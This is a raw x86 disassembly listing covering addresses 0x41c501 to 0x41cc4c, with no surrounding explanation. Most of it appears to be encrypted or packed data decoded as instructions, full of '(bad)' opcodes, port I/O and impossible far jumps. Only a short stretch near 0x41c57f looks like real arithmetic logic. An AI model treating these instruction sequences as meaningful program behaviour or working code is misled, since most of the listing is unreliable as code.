  41c501:	imul   DWORD PTR [eax]
  41c503:	(bad)  
  41c504:	cmp    ebx,esi
  41c506:	out    dx,eax
  41c507:	mov    esi,0xba67c438
  41c50c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c50d:	(bad)  [edi-0x30]
  41c510:	pushf  
  41c511:	push   0x8212073c
  41c516:	pop    es
  41c517:	rol    BYTE PTR [eax+0x7af8af2b],1
  41c51d:	cwde   
  41c51e:	push   0xf508e969
  41c523:	popa   
  41c524:	call   0x1247:0xcfa52908
  41c52b:	ret    0xea0
  41c52e:	pop    es
  41c52f:	cmp    DWORD PTR [ecx+0x40],0x38481230
  41c536:	pop    es
  41c537:	sub    al,0x1f
  41c539:	sbb    edx,DWORD PTR [ecx-0x7b]
  41c53c:	xchg   esi,eax
  41c53d:	cdq    
  41c53e:	sbb    DWORD PTR ds:0xa35b62d4,esp
  41c544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c545:	lock mov ah,0x57
  41c548:	aaa    
  41c549:	or     ebx,DWORD PTR [edi+ebp*1+0x3d57a619]
  41c550:	aad    0xf9
  41c552:	cmp    dh,BYTE PTR [ecx+0x26495c30]
  41c558:	or     BYTE PTR [edx],ah
  41c55a:	mov    dl,BYTE PTR [ebp-0x3e]
  41c55d:	jecxz  0x41c4e3
  41c55f:	les    esp,FWORD PTR [edx+0x3a58d257]
  41c565:	rcr    DWORD PTR [ebp-0x7063ae00],1
  41c56b:	imul   DWORD PTR [ebp+0x3]
  41c56e:	sbb    dh,BYTE PTR [edx]
  41c570:	outs   dx,BYTE PTR ds:[esi]
  41c571:	fidivr DWORD PTR [ebx-0x34c16da6]
  41c577:	jge    0x41c503
  41c579:	and    ecx,DWORD PTR ds:0x9f9fe77b
  41c57f:	pop    eax
  41c580:	xchg   esi,eax
  41c581:	mov    dh,0xa
  41c583:	xor    ecx,eax
  41c585:	xor    edx,eax
  41c587:	sub    ecx,edx
  41c589:	sub    ecx,esi
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	loope  0x41c63f
  41c5d2:	push   ds
  41c5d3:	and    edi,esi
  41c5d5:	loope  0x41c654
  41c5d7:	jp     0x41c5e3
  41c5d9:	pop    edi
  41c5da:	jp     0x41c656
  41c5dc:	pop    ds
  41c5dd:	fdiv   DWORD PTR [edi]
  41c5e0:	out    dx,al
  41c5e1:	mov    ?,WORD PTR [edi+eiz*8-0x4d]
  41c5e5:	scas   eax,DWORD PTR es:[edi]
  41c5e6:	aas    
  41c5e7:	sti    
  41c5e8:	out    0x97,eax
  41c5ea:	ror    BYTE PTR [edi-0x74623d0f],1
  41c5f0:	xor    DWORD PTR fs:[esi+0x6f2761c9],esi
  41c5f7:	mov    ch,0x30
  41c5f9:	retf   0x60a9
  41c5fc:	(bad)  
  41c5fd:	lods   eax,DWORD PTR ds:[esi]
  41c5fe:	(bad)  
  41c5ff:	or     al,0xed
  41c601:	into   
  41c602:	push   esp
  41c603:	jnp    0x41c5be
  41c605:	arpl   WORD PTR [edx+esi*8+0x3d07db14],cx
  41c60c:	jae    0x41c5e6
  41c60e:	jo     0x41c68e
  41c610:	lods   eax,DWORD PTR ds:[esi]
  41c611:	std    
  41c612:	mov    ebx,0xc7a487cf
  41c617:	ret    0xe2b6
  41c61a:	arpl   WORD PTR [esi+0x37bc5520],cx
  41c620:	ret    
  41c621:	adc    al,0x96
  41c623:	ror    BYTE PTR [ecx],cl
  41c625:	sbb    eax,0x584efcaf
  41c62a:	out    dx,eax
  41c62b:	lea    eax,[eax+0x29aa4760]
  41c631:	nop
  41c632:	pusha  
  41c633:	cdq    
  41c634:	pop    esi
  41c635:	mov    ebp,eax
  41c637:	push   ds
  41c638:	shr    DWORD PTR [eax],cl
  41c63a:	rcl    dl,cl
  41c63c:	lods   eax,DWORD PTR ds:[esi]
  41c63d:	lea    esp,[esi-0x20]
  41c640:	mov    ds:0x3fa855ec,al
  41c645:	sub    esi,DWORD PTR [ecx+0x3b]
  41c648:	jmp    0x41c63e
  41c64a:	adc    BYTE PTR [edx-0x62],cl
  41c64d:	pusha  
  41c64e:	jbe    0x41c6ba
  41c650:	push   0xffffff9e
  41c652:	and    DWORD PTR [eax+eiz*8+0x4da1b7a1],0xffffffa9
  41c65a:	dec    edi
  41c65b:	outs   dx,BYTE PTR ds:[esi]
  41c65c:	pop    eax
  41c65d:	lahf   
  41c65e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c65f:	in     eax,dx
  41c660:	add    BYTE PTR es:[edx+0x2023e636],bl
  41c667:	sbb    eax,0x3823bd9
  41c66c:	jno    0x41c666
  41c66e:	mov    WORD PTR [edi],?
  41c670:	mov    dl,0x69
  41c672:	arpl   WORD PTR [edx],si
  41c674:	mov    eax,ds:0x1f8ed783
  41c679:	mov    al,BYTE PTR [ebp+0x3d1a3dc8]
  41c67f:	cmp    edx,ecx
  41c681:	popa   
  41c682:	js     0x41c669
  41c684:	inc    edx
  41c685:	mov    BYTE PTR [edx],dl
  41c687:	mov    bl,0xc1
  41c689:	sub    esp,edi
  41c68b:	xchg   edi,eax
  41c68c:	idiv   BYTE PTR ds:0x6d2d04e3
  41c692:	adc    al,0x57
  41c694:	inc    ebp
  41c695:	aad    0x0
  41c697:	mov    esi,0x3846bef2
  41c69c:	fstp   TBYTE PTR [edx+0x27ac54d2]
  41c6a2:	loopne 0x41c6e1
  41c6a4:	mov    ecx,0x85dbc8c9
  41c6a9:	jmp    0x43d0a02c
  41c6ae:	push   esp
  41c6af:	xor    DWORD PTR [edx-0x59c77eb7],edi
  41c6b5:	fisttp WORD PTR [edx]
  41c6b7:	out    dx,al
  41c6b8:	and    al,0x3f
  41c6ba:	pop    edi
  41c6bb:	mov    bl,0xa2
  41c6bd:	dec    ebp
  41c6be:	int3   
  41c6bf:	js     0x41c67c
  41c6c1:	mov    eax,0x3269937d
  41c6c6:	cmc    
  41c6c7:	cmp    eax,0x35b5b16
  41c6cc:	jno    0x41c6b6
  41c6ce:	leave  
  41c6cf:	inc    edi
  41c6d0:	mov    edx,0xd7e86b86
  41c6d5:	(bad)  [edi]
  41c6d7:	add    esi,0xfffffffb
  41c6da:	das    
  41c6db:	sti    
  41c6dc:	sahf   
  41c6dd:	jne    0x41c703
  41c6df:	iret   
  41c6e0:	and    BYTE PTR [esi+0x5a],dh
  41c6e3:	ds xchg ebx,eax
  41c6e5:	stos   BYTE PTR es:[edi],al
  41c6e6:	or     bl,BYTE PTR [esi+esi*2-0x3f]
  41c6ea:	sahf   
  41c6eb:	add    eax,0xc9c997b9
  41c6f0:	repz fs cld 
  41c6f3:	push   esi
  41c6f4:	push   0x14
  41c6f6:	mov    ch,0x33
  41c6f8:	gs mov esi,0x616b3280
  41c6fe:	jne    0x41c71b
  41c700:	pushf  
  41c701:	std    
  41c702:	int3   
  41c703:	cs (bad) 
  41c705:	mov    ebx,0x55cce71e
  41c70a:	pop    eax
  41c70b:	push   ebp
  41c70c:	sbb    BYTE PTR [edi],ch
  41c70e:	lahf   
  41c70f:	outs   dx,BYTE PTR ds:[esi]
  41c710:	adc    cl,BYTE PTR [ebx+0x337fcfea]
  41c716:	sbb    cl,cl
  41c718:	mov    bh,0x8c
  41c71a:	stos   BYTE PTR es:[edi],al
  41c71b:	lea    ebp,[eax+0x71]
  41c71e:	popf   
  41c71f:	push   edx
  41c720:	mov    BYTE PTR [ebx+0x2a],0x11
  41c724:	sahf   
  41c725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c726:	les    edx,FWORD PTR [eax-0x6c0fe945]
  41c72c:	adc    al,0x4b
  41c72e:	outs   dx,DWORD PTR ds:[esi]
  41c72f:	or     eax,DWORD PTR [ebx]
  41c731:	add    dh,BYTE PTR [ecx]
  41c733:	sahf   
  41c734:	dec    esi
  41c735:	lahf   
  41c736:	xor    edi,DWORD PTR [esp+edx*4-0x5f]
  41c73a:	and    ecx,edx
  41c73c:	enter  0xf073,0x6b
  41c740:	cli    
  41c741:	pop    esi
  41c742:	mov    ebx,0xe74e4a9f
  41c747:	cmp    BYTE PTR [ebp+0x1e],dh
  41c74a:	shl    al,1
  41c74c:	push   cs
  41c74d:	fst    st(6)
  41c74f:	xchg   edx,eax
  41c750:	mov    esp,0x732835bb
  41c755:	dec    eax
  41c756:	popf   
  41c757:	jg     0x41c6f2
  41c759:	rcr    DWORD PTR [eax-0x18],0x25
  41c75d:	mov    cl,ch
  41c75f:	push   ebx
  41c760:	mov    eax,ds:0xeebeb612
  41c765:	aad    0xf9
  41c767:	stc    
  41c768:	imul   eax,DWORD PTR [ebx+ebp*1+0x4125066d],0xdcfa316a
  41c773:	stos   BYTE PTR es:[edi],al
  41c774:	xchg   esi,edx
  41c776:	(bad)  
  41c777:	dec    esp
  41c778:	mov    edx,0xf265b48c
  41c77d:	xchg   ebx,eax
  41c77e:	jnp    0x41c76c
  41c780:	pop    esi
  41c781:	cmp    eax,0x844da4ef
  41c786:	imul   ecx,DWORD PTR [ecx+eax*4+0x37],0xffffffc5
  41c78b:	sbb    cl,al
  41c78d:	xor    BYTE PTR [esi+edx*8-0x7c868a16],0xbf
  41c795:	scas   eax,DWORD PTR es:[edi]
  41c796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c797:	out    dx,eax
  41c798:	ret    0x72ce
  41c79b:	push   ebx
  41c79c:	mov    bh,0x9b
  41c79e:	into   
  41c79f:	inc    ecx
  41c7a0:	add    DWORD PTR [ebx],esi
  41c7a2:	jecxz  0x41c801
  41c7a4:	mov    bl,BYTE PTR [esi+0x4eaf351f]
  41c7aa:	sub    BYTE PTR [edi+eax*1+0x317943bb],bl
  41c7b1:	sbb    ah,BYTE PTR [ebx]
  41c7b3:	mov    ds:0x38220f5c,al
  41c7b8:	jne    0x41c7b5
  41c7ba:	pop    ecx
  41c7bb:	jb     0x41c7c5
  41c7bd:	jp     0x41c813
  41c7bf:	(bad)  
  41c7c0:	and    DWORD PTR [esi-0x7],edi
  41c7c3:	and    ebp,DWORD PTR [esi-0x32]
  41c7c6:	adc    edx,DWORD PTR [edi+0xd]
  41c7c9:	mov    al,ds:0xf43460d2
  41c7ce:	add    eax,0x1e81028f
  41c7d3:	jg     0x41c7d8
  41c7d5:	fisttp DWORD PTR [edi]
  41c7d7:	dec    edi
  41c7d8:	daa    
  41c7d9:	loop   0x41c847
  41c7db:	ror    DWORD PTR [edx+0x26],0x74
  41c7df:	xor    ecx,DWORD PTR [edi]
  41c7e1:	xlat   BYTE PTR ds:[ebx]
  41c7e2:	mov    ebp,ecx
  41c7e4:	sbb    BYTE PTR [ebp-0x79885a3],al
  41c7ea:	(bad)  
  41c7eb:	ror    DWORD PTR [ecx],1
  41c7ed:	xlat   BYTE PTR ds:[ebx]
  41c7ee:	sahf   
  41c7ef:	daa    
  41c7f0:	pusha  
  41c7f1:	aaa    
  41c7f2:	mov    dh,0xca
  41c7f4:	cmc    
  41c7f5:	es push edx
  41c7f7:	aad    0x27
  41c7f9:	mov    WORD PTR [edx+0x7e],ds
  41c7fc:	scas   eax,DWORD PTR es:[edi]
  41c7fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7fe:	jg     0x41c87e
  41c800:	out    dx,al
  41c801:	xchg   BYTE PTR [eax+0xe],dh
  41c804:	fimul  WORD PTR [edx]
  41c806:	xchg   WORD PTR [edi-0x3ed684cf],si
  41c80d:	and    al,0xd0
  41c80f:	sub    dl,BYTE PTR [ecx]
  41c811:	cs mov bh,0x4d
  41c814:	imul   esp,DWORD PTR [ecx+0x4efd3f6d],0x47
  41c81b:	(bad)  
  41c81c:	jmp    0x18308362
  41c821:	dec    ebp
  41c822:	add    DWORD PTR [ebp-0x7b4c9239],edi
  41c828:	push   0x3
  41c82a:	or     esi,DWORD PTR [ebp+0x26]
  41c82d:	mov    al,0xa8
  41c82f:	stos   DWORD PTR es:[edi],eax
  41c830:	xchg   bh,al
  41c832:	icebp  
  41c833:	mov    cl,0xe3
  41c835:	in     al,0x81
  41c837:	and    dl,BYTE PTR [edx+0x26]
  41c83a:	adc    esi,esp
  41c83c:	scas   eax,DWORD PTR es:[edi]
  41c83d:	mov    eax,ds:0x1daf7348
  41c842:	addr16 leave 
  41c844:	addr16 push 0x1dec0272
  41c84a:	mov    esi,0x3942f160
  41c84f:	lods   eax,DWORD PTR ds:[esi]
  41c850:	out    dx,al
  41c851:	hlt    
  41c852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c853:	inc    ebx
  41c854:	mov    esp,0x7742c452
  41c859:	sbb    ah,BYTE PTR [edi-0x78]
  41c85c:	mov    ecx,0x21ab7c2a
  41c861:	xor    al,0x85
  41c863:	inc    edi
  41c864:	mov    BYTE PTR es:[edx],ah
  41c867:	pop    edi
  41c868:	cli    
  41c869:	ret    0xd53c
  41c86c:	lds    esi,FWORD PTR [ebx-0x80]
  41c86f:	icebp  
  41c870:	xor    ebx,DWORD PTR [edi]
  41c872:	pop    ecx
  41c873:	stos   DWORD PTR es:[edi],eax
  41c874:	sbb    al,0xb9
  41c876:	popa   
  41c877:	repz ror BYTE PTR [edi+edi*2],cl
  41c87b:	mov    cl,0x3f
  41c87d:	xchg   ebx,eax
  41c87e:	jnp    0x41c85f
  41c880:	sar    DWORD PTR [ebx-0x4],0x7f
  41c884:	jns    0x41c88a
  41c886:	adc    edi,DWORD PTR [edi]
  41c888:	iret   
  41c889:	mov    cl,0xb0
  41c88b:	test   dl,0x12
  41c88e:	push   0xd3280920
  41c893:	sub    bl,BYTE PTR [eax]
  41c895:	stc    
  41c896:	int3   
  41c897:	mov    edi,0xa29de8b1
  41c89c:	ret    
  41c89d:	or     ch,BYTE PTR [edi]
  41c89f:	(bad)
  41c8a3:	xor    eax,0x6e32229f
  41c8a8:	int    0x31
  41c8aa:	fidiv  DWORD PTR [edi+0x4d]
  41c8ad:	jbe    0x41c8f2
  41c8af:	or     DWORD PTR [edx],ecx
  41c8b1:	nop
  41c8b2:	test   eax,edx
  41c8b4:	inc    edx
  41c8b5:	stos   DWORD PTR es:[edi],eax
  41c8b6:	rol    edx,1
  41c8b8:	xchg   ebp,eax
  41c8b9:	xchg   edi,eax
  41c8ba:	and    al,0x43
  41c8bc:	enter  0x3c53,0x1e
  41c8c0:	(bad)  
  41c8c1:	scas   eax,DWORD PTR es:[edi]
  41c8c2:	jle    0x41c876
  41c8c4:	data16 out dx,al
  41c8c6:	ins    DWORD PTR es:[edi],dx
  41c8c7:	sbb    DWORD PTR [esp+ecx*1+0x73],edi
  41c8cb:	cmc    
  41c8cc:	pushf  
  41c8cd:	cld    
  41c8ce:	cdq    
  41c8cf:	in     al,0x8
  41c8d1:	xor    ebp,DWORD PTR [ecx+0xff72c0a]
  41c8d7:	xchg   ebp,eax
  41c8d8:	jl     0x41c921
  41c8da:	push   0xadb59556
  41c8df:	retf   
  41c8e0:	xor    al,BYTE PTR [edx+0x2e]
  41c8e3:	jle    0x41c92b
  41c8e5:	xchg   edx,eax
  41c8e6:	sub    DWORD PTR [ecx-0x514d98ec],edi
  41c8ec:	ds call 0xc1e6:0xcdb0565
  41c8f4:	inc    ebp
  41c8f5:	mov    esp,0x729215ab
  41c8fa:	adc    DWORD PTR [ebp-0x251c984],edi
  41c900:	adc    eax,0x3bacbee
  41c905:	imul   edi,DWORD PTR [eax-0xe],0xffffffe3
  41c909:	(bad)  
  41c90a:	cs jp  0x41c8ad
  41c90d:	push   ebx
  41c90e:	imul   ecx,DWORD PTR [ebx],0x48070877
  41c914:	mov    eax,ebx
  41c916:	js     0x41c983
  41c918:	mov    ebp,0x356efbad
  41c91d:	ins    BYTE PTR es:[edi],dx
  41c91e:	add    ecx,0xffffffcb
  41c921:	std    
  41c922:	cmp    BYTE PTR [ebp-0x200ceb44],dh
  41c928:	adc    al,0x6d
  41c92a:	push   ecx
  41c92b:	retf   0xf039
  41c92e:	lea    esp,[ecx-0x189f9c6a]
  41c934:	das    
  41c935:	inc    edx
  41c936:	jno    0x41c977
  41c938:	out    dx,al
  41c939:	or     ebx,esi
  41c93b:	jo     0x41c94f
  41c93d:	xor    eax,0x526f33f5
  41c942:	sbb    ah,BYTE PTR [ebp-0x21]
  41c945:	xchg   edi,eax
  41c946:	retf   
  41c947:	and    al,0xcb
  41c949:	dec    ebx
  41c94a:	ror    DWORD PTR [ebx-0x55],1
  41c94d:	push   0xffffffef
  41c94f:	out    dx,al
  41c950:	cmc    
  41c951:	mov    WORD PTR [ecx],ss
  41c953:	mov    eax,DWORD PTR [ebx]
  41c955:	pop    es
  41c956:	sub    BYTE PTR [esi],ch
  41c958:	test   eax,0x4df96d49
  41c95d:	(bad)  
  41c95e:	cli    
  41c95f:	(bad)  
  41c960:	call   0xe3b0911a
  41c965:	vpsadbw ymm5,ymm5,YMMWORD PTR [eax+0x42dc76a2]
  41c96d:	push   cs
  41c96e:	sub    eax,0x8efac86c
  41c973:	stos   BYTE PTR es:[edi],al
  41c974:	xor    DWORD PTR [esi+0x7c],esp
  41c977:	test   eax,0x7f3ea48c
  41c97c:	(bad)  
  41c97d:	adc    al,0xf5
  41c97f:	sbb    esi,ecx
  41c981:	cmp    eax,0x7e2eec3d
  41c986:	xlat   BYTE PTR ds:[ebx]
  41c987:	sti    
  41c988:	outs   dx,DWORD PTR ds:[esi]
  41c989:	push   ecx
  41c98a:	pop    esi
  41c98b:	aam    0xc2
  41c98d:	int    0x1b
  41c98f:	mov    WORD PTR [ebp-0x61af1bd7],gs
  41c995:	adc    ebx,edi
  41c997:	inc    ecx
  41c998:	(bad)  
  41c999:	popf   
  41c99a:	jmp    0x9715:0x3f481a60
  41c9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9a2:	daa    
  41c9a3:	and    al,0xcb
  41c9a5:	popa   
  41c9a6:	retf   
  41c9a7:	rcr    ch,cl
  41c9a9:	inc    dl
  41c9ab:	dec    ecx
  41c9ac:	daa    
  41c9ad:	lahf   
  41c9ae:	add    BYTE PTR [eax-0x53a60e08],ah
  41c9b4:	leave  
  41c9b5:	or     DWORD PTR [eax],ecx
  41c9b7:	(bad)  
  41c9b8:	pop    eax
  41c9b9:	xchg   ebp,eax
  41c9ba:	jne    0x41c9ba
  41c9bc:	push   eax
  41c9bd:	push   edi
  41c9be:	scas   al,BYTE PTR es:[edi]
  41c9bf:	fldcw  WORD PTR [ebx]
  41c9c1:	fistp  DWORD PTR [edx]
  41c9c3:	xchg   DWORD PTR [esi+0x58afddfb],ecx
  41c9c9:	sar    DWORD PTR [ebp-0x41],0xd8
  41c9cd:	test   dh,0xc1
  41c9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9d1:	push   ss
  41c9d2:	cmp    eax,0x78e31def
  41c9d7:	imul   ebp,DWORD PTR [edx+edx*2+0x66],0x76
  41c9dc:	and    al,0x2b
  41c9de:	and    DWORD PTR [ecx],esp
  41c9e0:	pop    esi
  41c9e1:	out    dx,al
  41c9e2:	mov    eax,DWORD PTR [esi+0x68]
  41c9e5:	aad    0x7e
  41c9e7:	fstp   TBYTE PTR [esi+0x2b1199d8]
  41c9ed:	push   cs
  41c9ee:	lds    esi,FWORD PTR [ebx+0xf]
  41c9f1:	clc    
  41c9f2:	fistp  QWORD PTR [ecx]
  41c9f4:	std    
  41c9f5:	xlat   BYTE PTR ds:[ebx]
  41c9f6:	mov    ds:0xe59bc88,eax
  41c9fb:	aad    0xcd
  41c9fd:	out    dx,eax
  41c9fe:	shr    edi,cl
  41ca00:	push   ebx
  41ca01:	pop    esi
  41ca02:	test   eax,0xecfce907
  41ca07:	sub    dh,BYTE PTR [ebx-0x112671c9]
  41ca0d:	call   0x667ee69d
  41ca12:	into   
  41ca13:	sbb    eax,0x1cbeca6c
  41ca18:	call   0x3ed5a9cd
  41ca1d:	cmp    al,0x29
  41ca1f:	mov    edi,0xdb8aef8e
  41ca24:	lds    esp,FWORD PTR [ecx]
  41ca26:	jae    0x41ca32
  41ca28:	cmp    BYTE PTR [ebx+edx*8-0x662600c4],dh
  41ca2f:	adc    BYTE PTR [ebx+0x61],0x4a
  41ca33:	push   ss
  41ca34:	fs push ds
  41ca36:	mov    ch,0xa
  41ca38:	xor    ah,BYTE PTR [ebx+edx*2+0x173df9]
  41ca3f:	ins    BYTE PTR es:[edi],dx
  41ca40:	jns    0x41caae
  41ca42:	out    dx,al
  41ca43:	adc    edi,DWORD PTR [eax-0x87eb6d4]
  41ca49:	dec    edi
  41ca4a:	cld    
  41ca4b:	es and ebp,esp
  41ca4e:	cmp    eax,0x1bcd7950
  41ca53:	and    DWORD PTR [edi-0x6a],ecx
  41ca56:	gs pop es
  41ca58:	ins    DWORD PTR es:[edi],dx
  41ca59:	cmp    al,dl
  41ca5b:	pop    es
  41ca5c:	rcl    BYTE PTR [eax],0x82
  41ca5f:	xor    DWORD PTR fs:[ecx-0x3782e1a0],edx
  41ca66:	push   es
  41ca67:	popf   
  41ca68:	pop    es
  41ca69:	dec    ebx
  41ca6a:	shl    BYTE PTR [ebp-0x7c726ef9],1
  41ca70:	xlat   BYTE PTR ds:[ebx]
  41ca71:	mov    ebx,DWORD PTR [edx-0x18]
  41ca74:	std    
  41ca75:	arpl   di,ax
  41ca77:	mov    esp,0xae5ef832
  41ca7c:	xchg   edi,eax
  41ca7d:	and    BYTE PTR [ebp+0x7e],al
  41ca80:	sbb    WORD PTR [edi+0x45a81949],si
  41ca87:	mov    al,0x82
  41ca89:	fmul   DWORD PTR fs:[eax-0x4e]
  41ca8d:	fadd   DWORD PTR [edx]
  41ca8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca90:	cmp    eax,0x95d26187
  41ca95:	mov    ah,0x53
  41ca97:	push   eax
  41ca98:	fdiv   QWORD PTR [esi-0x52fdb937]
  41ca9e:	jo     0x41cafc
  41caa0:	outs   dx,BYTE PTR ds:[esi]
  41caa1:	jp     0x41caaa
  41caa3:	mov    ecx,0xece74748
  41caa8:	push   esp
  41caa9:	mov    esp,0xf69c75f2
  41caae:	fstp   st(1)
  41cab0:	sub    eax,DWORD PTR [ecx]
  41cab2:	xor    eax,0x81b6ce27
  41cab7:	ja     0x41caad
  41cab9:	es push esp
  41cabb:	repnz sub al,0x8a
  41cabe:	imul   ebp,DWORD PTR [ecx],0x9c8c3284
  41cac4:	bnd call 0x84a24741
  41caca:	sahf   
  41cacb:	shl    DWORD PTR [ebx],0x83
  41cace:	daa    
  41cacf:	fcomp  st(5)
  41cad1:	adc    eax,0xae1e9e68
  41cad6:	push   ebp
  41cad7:	mov    dl,0x13
  41cad9:	mov    cl,BYTE PTR [eax+0x8ee44d0]
  41cadf:	in     eax,dx
  41cae0:	adc    BYTE PTR [esi],ch
  41cae2:	add    DWORD PTR [eax],ecx
  41cae4:	imul   BYTE PTR [eax]
  41cae6:	out    dx,eax
  41cae7:	xchg   ecx,eax
  41cae8:	(bad)  
  41caea:	scas   al,BYTE PTR es:[edi]
  41caeb:	jge    0x41cb64
  41caed:	aas    
  41caee:	adc    dl,BYTE PTR [eax+0x2d]
  41caf1:	out    dx,eax
  41caf2:	jl     0x41cb20
  41caf4:	xor    ebx,edx
  41caf6:	or     al,0x71
  41caf8:	ficomp WORD PTR [edx-0x11]
  41cafb:	leave  
  41cafc:	push   eax
  41cafd:	in     eax,dx
  41cafe:	dec    eax
  41caff:	packsswb mm0,QWORD PTR [eax+edi*1-0x5d]
  41cb04:	lods   eax,DWORD PTR ds:[esi]
  41cb05:	mov    ah,0xb2
  41cb07:	push   eax
  41cb08:	xor    eax,0x28060867
  41cb0d:	mov    gs,WORD PTR [esi+eiz*8+0x70]
  41cb11:	aad    0x8a
  41cb13:	mov    edi,0x239911b0
  41cb18:	jb     0x41cabb
  41cb1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb1b:	ffreep st(7)
  41cb1d:	(bad)  
  41cb1e:	pop    ebp
  41cb1f:	outs   dx,DWORD PTR ds:[esi]
  41cb20:	int3   
  41cb21:	lds    ebp,FWORD PTR [edx+0x265202bf]
  41cb27:	ds in  al,dx
  41cb29:	push   0xa9d84f5
  41cb2e:	push   0xffffffb3
  41cb30:	(bad)  
  41cb31:	std    
  41cb32:	push   ebp
  41cb33:	int    0xbb
  41cb35:	xchg   edi,eax
  41cb36:	icebp  
  41cb37:	pop    ss
  41cb38:	rcr    DWORD PTR [esi+0x25690267],1
  41cb3e:	arpl   WORD PTR [esi+0x2cf41cb8],bx
  41cb44:	test   BYTE PTR gs:[ebp+0x7e4f3f8],al
  41cb4b:	popa   
  41cb4c:	sar    DWORD PTR [edx],0x4e
  41cb4f:	pop    edi
  41cb50:	cmp    DWORD PTR cs:[esi+0x3f70174f],eax
  41cb57:	adc    eax,0xaa67670f
  41cb5c:	mov    eax,0x4c0e7f1c
  41cb61:	xchg   esi,eax
  41cb62:	lods   eax,DWORD PTR ds:[esi]
  41cb63:	mov    eax,ds:0x1da3c1c7
  41cb68:	jne    0x41cb76
  41cb6a:	retf   
  41cb6b:	mov    DWORD PTR ds:0x8237ca47,ebp
  41cb71:	adc    BYTE PTR [ecx],dh
  41cb73:	(bad)  
  41cb74:	imul   esp,DWORD PTR [ebx-0x12149486],0xffffffdd
  41cb7b:	pop    edi
  41cb7c:	adc    eax,0x5b10cfa9
  41cb81:	pmaddwd mm5,QWORD PTR ds:[esi]
  41cb85:	mov    esi,0xa8ad8bf1
  41cb8a:	mov    al,ds:0xe4e962e2
  41cb8f:	imul   eax,DWORD PTR [ebx+0x10],0x4
  41cb93:	in     eax,dx
  41cb94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb95:	(bad)  
  41cb96:	jbe    0x41cbcb
  41cb98:	mov    ebx,0x2ed85cb4
  41cb9d:	dec    edi
  41cb9e:	push   ecx
  41cb9f:	adc    eax,0x2b74b314
  41cba4:	aad    0xab
  41cba6:	arpl   bx,bx
  41cba8:	jle    0x41cb83
  41cbaa:	jmp    0x27e5:0xee2f468e
  41cbb1:	in     al,dx
  41cbb2:	(bad)  
  41cbb3:	pop    eax
  41cbb4:	push   ds
  41cbb5:	je     0x41cbe0
  41cbb7:	dec    esi
  41cbb8:	dec    esp
  41cbb9:	lods   al,BYTE PTR ds:[esi]
  41cbba:	in     al,0xe1
  41cbbc:	stos   BYTE PTR es:[edi],al
  41cbbd:	shl    DWORD PTR [eax-0x59],cl
  41cbc0:	mov    dl,0xf6
  41cbc2:	mov    BYTE PTR [ebp+0x6e98062b],0x21
  41cbc9:	xchg   DWORD PTR [eax-0x73],eax
  41cbcc:	shl    ch,cl
  41cbce:	mov    ?,WORD PTR [ebx-0x50]
  41cbd1:	mov    dh,0xb
  41cbd3:	inc    esp
  41cbd4:	(bad)  
  41cbd5:	(bad)  
  41cbd6:	mov    ecx,0xad531477
  41cbdb:	mov    dh,0xfd
  41cbdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbde:	add    DWORD PTR [eax],esp
  41cbe0:	adc    ah,BYTE PTR [esi+0xd]
  41cbe3:	pop    eax
  41cbe4:	pop    esp
  41cbe5:	out    0xe0,eax
  41cbe7:	jne    0x41cc38
  41cbe9:	sub    eax,0x722d9ab0
  41cbee:	cmp    al,0x53
  41cbf0:	icebp  
  41cbf1:	mov    ebp,0x7fd8e103
  41cbf6:	and    DWORD PTR [edi+edx*2+0x4394c60f],esi
  41cbfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfe:	or     DWORD PTR [ebx],edi
  41cc00:	lock dec edi
  41cc02:	mov    edi,0x422af74
  41cc07:	jbe    0x41cb9f
  41cc09:	add    ecx,0x51
  41cc0c:	ds ds gs xchg esi,eax
  41cc10:	mov    edi,0x97c37809
  41cc15:	mov    al,gs:0x316aa4dc
  41cc1b:	sub    eax,0xb842ce3d
  41cc20:	add    eax,0x665054c4
  41cc25:	adc    esp,DWORD PTR [edx+0x76ccd539]
  41cc2b:	sbb    ebp,ecx
  41cc2d:	add    ch,BYTE PTR [edx]
  41cc2f:	std    
  41cc30:	out    dx,al
  41cc31:	daa    
  41cc32:	jecxz  0x41cc3b
  41cc34:	xor    al,0x5f
  41cc36:	sar    esi,cl
  41cc38:	sub    BYTE PTR [ebx+0x11],al
  41cc3b:	retf   
  41cc3c:	sti    
  41cc3d:	pop    esp
  41cc3e:	nop
  41cc3f:	fbstp  TBYTE PTR [eax+edi*2-0x67]
  41cc43:	or     dl,BYTE PTR [ecx+0x31]
  41cc46:	mov    ecx,0x5f23391e
  41cc4b:	leave  
  41cc4c:	and    DWORD PTR [ebx],eax
